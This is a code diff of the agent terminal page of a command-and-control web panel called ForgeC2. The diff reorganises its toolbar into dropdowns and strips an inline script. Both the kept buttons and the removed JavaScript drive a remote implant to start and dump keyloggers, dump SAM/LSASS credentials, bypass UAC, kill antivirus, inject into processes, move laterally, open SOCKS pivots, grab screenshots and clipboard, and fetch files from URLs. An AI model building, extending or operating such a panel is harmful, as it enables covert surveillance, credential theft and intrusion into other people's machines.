@@ -12,84 +12,85 @@
                     <span>{{.Agent.Username}}@{{.Agent.IP}}</span>
                     {{if eq .Agent.Status "online"}}
                     <span class="flex items-center text-emerald-400"><i class="fa-solid fa-circle fa-beat mr-1 text-[6px]"></i> LIVE</span>
+                    {{else if eq .Agent.Status "stale"}}
+                    <span class="text-amber-400">STALE</span>
                     {{else}}
                     <span class="text-red-400">OFFLINE</span>
                     {{end}}
                 </div>
             </div>
         </div>
-        <div class="flex items-center gap-x-2">
-            <select id="shell-select" class="bg-slate-700 border border-slate-600 text-white text-sm rounded-lg px-3 h-8">
+        <div class="flex items-center gap-x-1.5">
+            <select id="shell-select" class="bg-slate-700 border border-slate-600 text-white text-xs rounded-lg px-2 h-8">
                 <option value="cmd.exe">cmd.exe</option>
                 <option value="powershell.exe">powershell.exe</option>
             </select>
-            <button onclick="requestPS()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="进程列表">
-                <i class="fa-solid fa-list mr-1"></i> PS
+            <button onclick="executeCommand()" class="bg-emerald-600 hover:bg-emerald-700 text-white text-xs px-3 h-8 rounded-lg">
+                <i class="fa-solid fa-play mr-1"></i>执行
             </button>
-            <button onclick="requestScreenshot()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="截图">
-                <i class="fa-solid fa-camera mr-1"></i> 截图
+            <button onclick="clearTerminal()" class="bg-slate-600 hover:bg-slate-500 text-white text-xs px-2 h-8 rounded-lg" title="清屏">
+                <i class="fa-solid fa-eraser"></i>
             </button>
-            <button onclick="startKeylogger()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="启动键盘记录">
-                <i class="fa-solid fa-keyboard mr-1"></i> KL Start
-            </button>
-            <button onclick="stopKeylogger()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="停止键盘记录">
-                <i class="fa-solid fa-stop mr-1"></i> KL Stop
-            </button>
-            <button onclick="dumpKeylogger()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg" title="转储键盘记录">
-                <i class="fa-solid fa-download mr-1"></i> KL Dump
-            </button>
-            <button onclick="clearTerminal()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3 h-8 rounded-lg">
-                <i class="fa-solid fa-trash mr-1"></i> Clear
-            </button>
-            <!-- Process pause for games etc -->
-            <input id="proc-target" type="text" placeholder="pid or game.exe" class="bg-slate-700 border border-slate-600 text-white text-xs px-2 h-8 rounded-lg w-32" />
-            <button onclick="suspendProc()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-3 h-8 rounded-lg" title="暂停进程 (pause game)">
-                <i class="fa-solid fa-pause mr-1"></i> Suspend
-            </button>
-            <button onclick="resumeProc()" class="bg-emerald-700 hover:bg-emerald-600 text-white text-xs px-3 h-8 rounded-lg" title="恢复进程">
-                <i class="fa-solid fa-play mr-1"></i> Resume
-            </button>
-            <button onclick="quickCmd('whoami')" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">whoami</button>
-            <button onclick="quickCmd('systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;')" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">sysinfo</button>
-            <button onclick="quickCmd('net user')" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">net user</button>
-            <button onclick="quickCmd('ipconfig /all')" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">ipconfig</button>
-            <button onclick="killProc()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-3 h-8 rounded-lg" title="终止进程">
-                <i class="fa-solid fa-skull mr-1"></i> Kill
-            </button>
-            <button onclick="clipGet()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg" title="读取剪贴板">Clip Get</button>
-            <button onclick="clipSet()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg" title="设置剪贴板">Clip Set</button>
-            <input id="find-pattern" type="text" placeholder="*.exe or name" class="bg-slate-700 border border-slate-600 text-white text-xs px-2 h-8 rounded-lg w-24" />
-            <button onclick="findFiles()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">Find</button>
-            <button onclick="listDrives()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">Drives</button>
-            <button onclick="forceBeacon()" class="bg-emerald-700 hover:bg-emerald-600 text-white text-xs px-2 h-8 rounded-lg" title="强制立即回连">Beacon Now</button>
-            <button onclick="doReboot()" class="bg-orange-700 hover:bg-orange-600 text-white text-xs px-2 h-8 rounded-lg">Reboot</button>
-            <button onclick="doShutdown()" class="bg-red-800 hover:bg-red-700 text-white text-xs px-2 h-8 rounded-lg">Shutdown</button>
-            <button onclick="listServices()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">Services</button>
-            <button onclick="doPortScan()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">PortScan</button>
-            <button onclick="doNetstat()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">Netstat</button>
-            <button onclick="doUsers()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">Users</button>
-            <button onclick="doAV()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">AV</button>
-            <button onclick="doDownloadURL()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg">DL URL</button>
-            <button onclick="doUninstall()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-2 h-8 rounded-lg">Uninstall</button>
-            <button onclick="doSetSleep()" class="bg-purple-700 hover:bg-purple-600 text-white text-xs px-2 h-8 rounded-lg">Set Sleep</button>
-            <button onclick="killAV()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-3 h-8 rounded-lg" title="一键杀死反病毒软件">
-                <i class="fa-solid fa-skull-crossbones mr-1"></i> Kill AV
-            </button>
-            <button onclick="doElevate()" class="bg-purple-700 hover:bg-purple-600 text-white text-xs px-3 h-8 rounded-lg" title="超级提权 (UAC bypass)">
-                <i class="fa-solid fa-user-shield mr-1"></i> Elevate
-            </button>
-            <button onclick="doCreds()" class="bg-amber-700 hover:bg-amber-600 text-white text-xs px-3 h-8 rounded-lg" title="凭证转储 (SAM/LSASS)">
-                <i class="fa-solid fa-key mr-1"></i> Creds
-            </button>
-            <button onclick="doInject()" class="bg-slate-700 hover:bg-slate-600 text-white text-xs px-2 h-8 rounded-lg" title="进程注入 (CRT/APC)">
-                <i class="fa-solid fa-syringe mr-1"></i> Inject
-            </button>
-            <button onclick="doLateral()" class="bg-indigo-700 hover:bg-indigo-600 text-white text-xs px-2 h-8 rounded-lg" title="横向移动 (psexec/winrm/wmi)">
-                <i class="fa-solid fa-network-wired mr-1"></i> Lateral
-            </button>
-            <button onclick="doSocks()" class="bg-teal-700 hover:bg-teal-600 text-white text-xs px-2 h-8 rounded-lg" title="启动SOCKS5代理 (pivoting)">
-                <i class="fa-solid fa-plug mr-1"></i> SOCKS
-            </button>
+            <!-- Quick commands dropdown -->
+            <div class="relative group">
+                <button class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs px-3 h-8 rounded-lg">
+                    <i class="fa-solid fa-bolt mr-1"></i>快捷
+                </button>
+                <div class="hidden group-hover:block absolute top-full left-0 mt-1 bg-slate-700 border border-slate-600 rounded-xl shadow-xl z-50 min-w-[140px] py-2">
+                    <button onclick="quickCmd('whoami')" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">whoami</button>
+                    <button onclick="quickCmd('systeminfo | findstr /B /C:OS')" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">sysinfo</button>
+                    <button onclick="quickCmd('net user')" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">net user</button>
+                    <button onclick="quickCmd('ipconfig /all')" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">ipconfig</button>
+                    <hr class="border-slate-600 my-1">
+                    <button onclick="listDrives()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Drives</button>
+                    <button onclick="doNetstat()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Netstat</button>
+                    <button onclick="doUsers()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Users</button>
+                    <button onclick="listServices()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Services</button>
+                    <button onclick="doAV()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">AV</button>
+                </div>
+            </div>
+            <!-- Recon dropdown -->
+            <div class="relative group">
+                <button class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs px-3 h-8 rounded-lg">
+                    <i class="fa-solid fa-magnifying-glass mr-1"></i>侦察
+                </button>
+                <div class="hidden group-hover:block absolute top-full left-0 mt-1 bg-slate-700 border border-slate-600 rounded-xl shadow-xl z-50 min-w-[120px] py-2">
+                    <button onclick="requestPS()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5"><i class="fa-solid fa-list mr-2 w-3"></i>进程列表</button>
+                    <button onclick="requestScreenshot()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5"><i class="fa-solid fa-camera mr-2 w-3"></i>截图</button>
+                    <button onclick="doCreds()" class="block w-full text-left text-xs text-amber-300 hover:bg-slate-600 hover:text-white px-4 py-1.5"><i class="fa-solid fa-key mr-2 w-3"></i>Creds</button>
+                    <button onclick="doPortScan()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5"><i class="fa-solid fa-satellite-dish mr-2 w-3"></i>PortScan</button>
+                    <hr class="border-slate-600 my-1">
+                    <button onclick="startKeylogger()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">KL Start</button>
+                    <button onclick="dumpKeylogger()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">KL Dump</button>
+                    <button onclick="stopKeylogger()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">KL Stop</button>
+                </div>
+            </div>
+            <!-- Actions dropdown -->
+            <div class="relative group">
+                <button class="bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs px-3 h-8 rounded-lg">
+                    <i class="fa-solid fa-wrench mr-1"></i>操作
+                </button>
+                <div class="hidden group-hover:block absolute top-full left-0 mt-1 bg-slate-700 border border-slate-600 rounded-xl shadow-xl z-50 min-w-[130px] py-2">
+                    <button onclick="doInject()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Inject</button>
+                    <button onclick="doLateral()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Lateral</button>
+                    <button onclick="doSocks()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">SOCKS</button>
+                    <button onclick="doElevate()" class="block w-full text-left text-xs text-purple-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Elevate</button>
+                    <button onclick="killAV()" class="block w-full text-left text-xs text-red-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Terminate AV</button>
+                    <hr class="border-slate-600 my-1">
+                    <button onclick="doDownloadURL()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">DL URL</button>
+                    <button onclick="doSetSleep()" class="block w-full text-left text-xs text-slate-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Set Sleep</button>
+                    <button onclick="forceBeacon()" class="block w-full text-left text-xs text-emerald-300 hover:bg-slate-600 hover:text-white px-4 py-1.5">Force Check-in</button>
+                </div>
+            </div>
+            <!-- Utility buttons row -->
+            <span class="text-slate-600 mx-0.5">|</span>
+            <input id="proc-target" type="text" placeholder="PID" class="bg-slate-700 border border-slate-600 text-white text-xs px-2 h-8 rounded-lg w-16" />
+            <button onclick="suspendProc()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-2 h-8 rounded-lg" title="Suspend">⏸</button>
+            <button onclick="resumeProc()" class="bg-emerald-700 hover:bg-emerald-600 text-white text-xs px-2 h-8 rounded-lg" title="Resume">▶</button>
+            <button onclick="killProc()" class="bg-red-700 hover:bg-red-600 text-white text-xs px-2 h-8 rounded-lg" title="Kill process">☠</button>
+            <span class="text-slate-600 mx-0.5">|</span>
+            <button onclick="doReboot()" class="bg-slate-700 hover:bg-orange-600 text-slate-300 text-xs px-2 h-8 rounded-lg" title="Reboot">⟳</button>
+            <button onclick="doShutdown()" class="bg-slate-700 hover:bg-red-600 text-slate-300 text-xs px-2 h-8 rounded-lg" title="Shutdown">⏻</button>
         </div>
     </div>
 
@@ -101,457 +102,24 @@
     </div>
 
     <!-- Command Input -->
-    <div class="bg-slate-800 border-t border-slate-700 px-6 py-4">
+    <div class="bg-slate-800 border-t border-slate-700 px-6 py-3">
         <div class="flex gap-2">
             <div class="flex-1 relative">
                 <span id="prompt" class="absolute left-3 top-1/2 -translate-y-1/2 text-emerald-400 font-mono">CMD></span>
                 <input type="text" id="cmd-input" placeholder="" 
-                       class="w-full bg-slate-700 border border-slate-600 text-white font-mono text-sm rounded-lg pl-12 pr-4 h-11 focus:border-emerald-500 focus:outline-none"
-                       onkeydown="handleKeyDown(event)" oninput="handleInput(event)" autocomplete="off">
-                <!-- Autocomplete dropdown -->
-                <div id="autocomplete-container" class="hidden absolute bottom-full left-0 right-0 mb-2 bg-slate-700 border border-slate-600 rounded-lg shadow-lg max-h-60 overflow-y-auto z-50"></div>
+                       class="w-full bg-slate-700 border border-slate-600 text-white font-mono text-sm rounded-lg pl-12 pr-4 h-10 focus:border-emerald-500 focus:outline-none"
+                       onkeydown="handleKeyDown(event)" autocomplete="off">
             </div>
-            <button onclick="executeCommand()" class="px-6 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg h-11 text-sm font-medium">
-                <i class="fa-solid fa-play mr-1"></i> Execute
-            </button>
         </div>
-        <div class="mt-2 text-xs text-slate-500 flex gap-4">
-            <span><kbd class="px-2 py-1 bg-slate-700 rounded">↑↓</kbd> 历史</span>
-            <span><kbd class="px-2 py-1 bg-slate-700 rounded">Tab</kbd> 补全</span>
-            <span><kbd class="px-2 py-1 bg-slate-700 rounded">Ctrl+Enter</kbd> 执行</span>
-            <span><kbd class="px-2 py-1 bg-slate-700 rounded">Ctrl+L</kbd> 清屏</span>
+        <div class="mt-1 text-[10px] text-slate-500 flex gap-3">
+            <span><kbd class="px-1.5 py-0.5 bg-slate-700 rounded">↑↓</kbd> 历史</span>
+            <span><kbd class="px-1.5 py-0.5 bg-slate-700 rounded">Tab</kbd> 补全</span>
+            <span><kbd class="px-1.5 py-0.5 bg-slate-700 rounded">Enter</kbd> 执行</span>
         </div>
     </div>
 </div>
 
 <script src="/static/js/command-history.js"></script>
-<script>
-    const agentId = '{{.Agent.ID}}';
-    const osType = '{{.Agent.OS}}' === 'Linux' ? 'linux' : 'windows';
-
-    function handleKeyDown(event) {
-        const input = document.getElementById('cmd-input');
-        const autocompleteContainer = document.getElementById('autocomplete-container');
-        
-        if (event.key === 'Enter') {
-            event.preventDefault();
-            executeCommand();
-        } else if (event.key === 'ArrowUp') {
-            event.preventDefault();
-            const prevValue = CommandHistory.up(input.value);
-            input.value = prevValue;
-        } else if (event.key === 'ArrowDown') {
-            event.preventDefault();
-            const nextValue = CommandHistory.down(input.value);
-            input.value = nextValue;
-        } else if (event.key === 'Tab') {
-            event.preventDefault();
-            const selected = AutoComplete.getSelected();
-            if (selected) {
-                input.value = selected;
-                AutoComplete.hide(autocompleteContainer);
-            } else {
-                // Show suggestions
-                const suggestions = AutoComplete.getSuggestions(input.value, osType);
-                if (suggestions.length > 0) {
-                    input.value = suggestions[0];
-                }
-            }
-        } else if (event.key === 'Escape') {
-            AutoComplete.hide(autocompleteContainer);
-        } else if (event.key === 'l' && event.ctrlKey) {
-            event.preventDefault();
-            clearTerminal();
-        }
-    }
-
-    function handleInput(event) {
-        const input = document.getElementById('cmd-input');
-        const autocompleteContainer = document.getElementById('autocomplete-container');
-        
-        if (input.value.trim()) {
-            AutoComplete.show(autocompleteContainer, input.value, (selected) => {
-                input.value = selected;
-                input.focus();
-            });
-        } else {
-            AutoComplete.hide(autocompleteContainer);
-        }
-    }
-
-    function requestPS() {
-        fetch(`/agents/${agentId}/ps`, { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    appendOutput('<span class="text-amber-400">PS></span> <span class="text-white">tasklist</span>');
-                    appendOutput('<span class="text-slate-500">进程列表已请求...</span>');
-                    setTimeout(() => fetchResult(data.task_id), 2000);
-                }
-            });
-    }
-
-    function requestScreenshot() {
-        fetch(`/agents/${agentId}/screenshot`, { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">screenshot</span>');
-                    appendOutput('<span class="text-slate-500">截图已请求...</span>');
-                    setTimeout(() => fetchResult(data.task_id), 3000);
-                }
-            });
-    }
-
-    function executeCommand() {
-        const input = document.getElementById('cmd-input');
-        const cmd = input.value.trim();
-        const shell = document.getElementById('shell-select').value;
-        
-        if (!cmd) return;
-        
-        // Add to history (using CommandHistory module)
-        CommandHistory.add(cmd);
-        CommandHistory.resetIndex();
-        
-        // Update prompt
-        const prompt = shell === 'powershell.exe' ? 'PS>' : 'CMD>';
-        document.getElementById('prompt').textContent = prompt;
-        
-        // Display command
-        appendOutput(`<span class="text-amber-400">${prompt}</span> <span class="text-white">${escapeHtml(cmd)}</span>`);
-        
-        // Clear input
-        input.value = '';
-        
-        // Send command
-        appendOutput('<span class="text-slate-500">Executing...</span>');
-        
-        fetch(`/agents/${agentId}/command`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: `command=${encodeURIComponent(cmd)}&shell=${shell}`
-        }).then(r => r.json()).then(data => {
-            if (data.success) {
-                // Wait for result
-                setTimeout(() => fetchResult(data.task_id), 2000);
-            } else {
-                appendOutput('<span class="text-red-400">Error: ' + (data.error || 'Failed to send command') + '</span>');
-            }
-        }).catch(err => {
-            appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
-        });
-    }
-
-    function fetchResult(taskId) {
-        fetch(`/agents/${agentId}/tasks/${taskId}`)
-            .then(r => r.json())
-            .then(data => {
-                if (data.error) {
-                    appendOutput('<span class="text-red-400">Error: ' + escapeHtml(data.error) + '</span>');
-                    return;
-                }
-                
-                const status = data.status;
-                
-                if (status === 'completed') {
-                    if (data.result && data.result.trim()) {
-                        let out = data.result;
-                        // Auto-decode base64 for keylogger dumps
-                        if (data.encoding === 'base64' || (out.length > 40 && /^[A-Za-z0-9+/=]+$/.test(out))) {
-                            try {
-                                const decoded = atob(out);
-                                out = decoded;
-                            } catch (e) {}
-                        }
-                        appendOutput('<span class="text-emerald-300">' + escapeHtml(out) + '</span>');
-                    } else {
-                        appendOutput('<span class="text-emerald-300">Command executed successfully</span>');
-                    }
-                } else if (status === 'failed') {
-                    if (data.error && data.error.trim()) {
-                        appendOutput('<span class="text-red-400">' + escapeHtml(data.error) + '</span>');
-                    } else {
-                        appendOutput('<span class="text-red-400">Command failed</span>');
-                    }
-                } else {
-                    // Still pending or running
-                    appendOutput('<span class="text-yellow-400">Waiting for response...</span>');
-                    setTimeout(() => fetchResult(taskId), 3000);
-                }
-            }).catch(err => {
-                appendOutput('<span class="text-red-400">Network error: ' + err + '</span>');
-            });
-    }
-
-    function appendOutput(html) {
-        const output = document.getElementById('terminal-output');
-        const line = document.createElement('div');
-        line.innerHTML = html;
-        output.appendChild(line);
-        output.scrollTop = output.scrollHeight;
-    }
-
-    function clearTerminal() {
-        const output = document.getElementById('terminal-output');
-        output.innerHTML = `
-            <div class="text-slate-500">ForgeC2 Shell Terminal - Agent: {{.Agent.Hostname}}</div>
-            <div class="text-slate-500">Terminal cleared.</div>
-            <div class="text-slate-500 mb-4">---</div>
-        `;
-    }
-
-    function startKeylogger() {
-        fetch(`/agents/${agentId}/keylogger/start`, { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger started</span>');
-                    setTimeout(() => fetchResult(data.task_id), 1500);
-                }
-            });
-    }
-
-    function stopKeylogger() {
-        fetch(`/agents/${agentId}/keylogger/stop`, { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">keylogger stopped</span>');
-                    setTimeout(() => fetchResult(data.task_id), 1500);
-                }
-            });
-    }
-
-    function dumpKeylogger() {
-        appendOutput('<span class="text-amber-400">KL></span> <span class="text-white">dumping keylog...</span>');
-        fetch(`/agents/${agentId}/keylogger/dump`, { method: 'POST' })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    setTimeout(() => fetchResult(data.task_id), 2000);
-                }
-            });
-    }
-
-    function suspendProc() {
-        const target = document.getElementById('proc-target').value.trim() || '';
-        if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
-        appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">suspend ' + escapeHtml(target) + '</span>');
-        fetch(`/agents/${agentId}/suspend`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'target=' + encodeURIComponent(target)
-        }).then(r => r.json()).then(data => {
-            if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
-        });
-    }
-
-    function resumeProc() {
-        const target = document.getElementById('proc-target').value.trim() || '';
-        if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
-        appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">resume ' + escapeHtml(target) + '</span>');
-        fetch(`/agents/${agentId}/resume`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'target=' + encodeURIComponent(target)
-        }).then(r => r.json()).then(data => {
-            if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
-        });
-    }
-
-    function quickCmd(cmd) {
-        appendOutput('<span class="text-amber-400">CMD></span> <span class="text-white">' + escapeHtml(cmd) + '</span>');
-        fetch(`/agents/${agentId}/command`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'command=' + encodeURIComponent(cmd) + '&shell=cmd.exe'
-        }).then(r => r.json()).then(data => {
-            if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
-        });
-    }
-
-    function killProc() {
-        const target = document.getElementById('proc-target').value.trim() || '';
-        if (!target) { appendOutput('<span class="text-red-400">请输入 PID 或进程名</span>'); return; }
-        appendOutput('<span class="text-amber-400">PROC></span> <span class="text-white">killproc ' + escapeHtml(target) + '</span>');
-        fetch(`/agents/${agentId}/killproc`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'target=' + encodeURIComponent(target)
-        }).then(r => r.json()).then(data => {
-            if (data.success) setTimeout(() => fetchResult(data.task_id), 1500);
-        });
-    }
-
-    function clipGet() {
-        appendOutput('<span class="text-amber-400">CLIP></span> <span class="text-white">get</span>');
-        fetch(`/agents/${agentId}/clipboard/get`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1200); });
-    }
-    function clipSet() {
-        const data = prompt('输入要设置到剪贴板的内容:');
-        if (!data) return;
-        fetch(`/agents/${agentId}/clipboard/set`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'data=' + encodeURIComponent(data)
-        }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-emerald-400">剪贴板已设置</span>'); });
-    }
-    function findFiles() {
-        const pattern = document.getElementById('find-pattern').value.trim() || '*';
-        appendOutput('<span class="text-amber-400">FIND></span> <span class="text-white">pattern=' + escapeHtml(pattern) + '</span>');
-        fetch(`/agents/${agentId}/find`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'pattern=' + encodeURIComponent(pattern)
-        }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
-    }
-
-    function listDrives() {
-        appendOutput('<span class="text-amber-400">DRIVES></span> <span class="text-white">listing...</span>');
-        fetch(`/agents/${agentId}/drives`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
-    }
-
-    function forceBeacon() {
-        appendOutput('<span class="text-emerald-400">BEACON></span> <span class="text-white">forcing check-in...</span>');
-        fetch(`/agents/${agentId}/beacon_now`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 500); });
-    }
-
-    function doReboot() {
-        if (!confirm('确认重启目标机器?')) return;
-        fetch(`/agents/${agentId}/reboot`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-orange-400">Reboot sent</span>'); });
-    }
-
-    function doShutdown() {
-        if (!confirm('确认关机目标机器?')) return;
-        fetch(`/agents/${agentId}/shutdown`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Shutdown sent</span>'); });
-    }
-
-    function listServices() {
-        appendOutput('<span class="text-amber-400">SERVICES></span> <span class="text-white">listing...</span>');
-        fetch(`/agents/${agentId}/services`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
-    }
-
-    function doPortScan() {
-        const t = prompt("Target e.g. 192.168.1.1:22,80,443 or 10.0.0.0/24:22");
-        if (!t) return;
-        appendOutput('<span class="text-amber-400">SCAN></span> ' + escapeHtml(t));
-        fetch(`/agents/${agentId}/portscan`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'target=' + encodeURIComponent(t) })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 3000); });
-    }
-
-    function doNetstat() {
-        appendOutput('<span class="text-amber-400">NETSTAT></span> ...');
-        fetch(`/agents/${agentId}/netstat`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
-    }
-
-    function doUsers() {
-        appendOutput('<span class="text-amber-400">USERS></span> ...');
-        fetch(`/agents/${agentId}/users`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1500); });
-    }
-
-    function doAV() {
-        appendOutput('<span class="text-amber-400">AV></span> ...');
-        fetch(`/agents/${agentId}/av`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
-    }
-
-    function doDownloadURL() {
-        const url = prompt("URL to download:");
-        if (!url) return;
-        const dest = prompt("Dest path (optional):", "");
-        fetch(`/agents/${agentId}/download_url`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'url=' + encodeURIComponent(url) + '&dest=' + encodeURIComponent(dest) })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
-    }
-
-    function doUninstall() {
-        if (!confirm('Uninstall persistence and self-delete?')) return;
-        fetch(`/agents/${agentId}/uninstall`, { method: 'POST' }).then(r => r.json()).then(data => { if (data.success) appendOutput('<span class="text-red-400">Uninstall sent</span>'); });
-    }
-
-    function doSetSleep() {
-        const s = prompt("New sleep,jitter e.g. 30,20");
-        if (!s) return;
-        fetch(`/agents/${agentId}/set_sleep`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'sleep=' + encodeURIComponent(s) })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 1000); });
-    }
-
-    function killAV() {
-        if (!confirm('确认一键杀死反病毒软件？这可能触发告警！')) return;
-        appendOutput('<span class="text-red-400">KILL_AV></span> <span class="text-white">attempting to kill AV processes...</span>');
-        fetch(`/agents/${agentId}/kill_av`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 2000); });
-    }
-
-    function doElevate() {
-        const cmd = prompt("提权后执行的命令 (留空默认 whoami):", "");
-        appendOutput('<span class="text-purple-400">ELEVATE></span> <span class="text-white">' + escapeHtml(cmd || "default") + '</span>');
-        fetch(`/agents/${agentId}/elevate`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'cmd=' + encodeURIComponent(cmd || "")
-        }).then(r => r.json()).then(data => {
-            if (data.success) setTimeout(() => fetchResult(data.task_id), 3000);
-        });
-    }
-
-    function doCreds() {
-        appendOutput('<span class="text-amber-400">CREDS></span> dumping SAM/LSASS... (may require high priv)');
-        fetch(`/agents/${agentId}/creds`, { method: 'POST' })
-            .then(r => r.json()).then(data => { if (data.success) setTimeout(() => fetchResult(data.task_id), 4000); });
-    }
-
-    function doInject() {
-        const pid = prompt("Target PID:", "");
-        if (!pid) return;
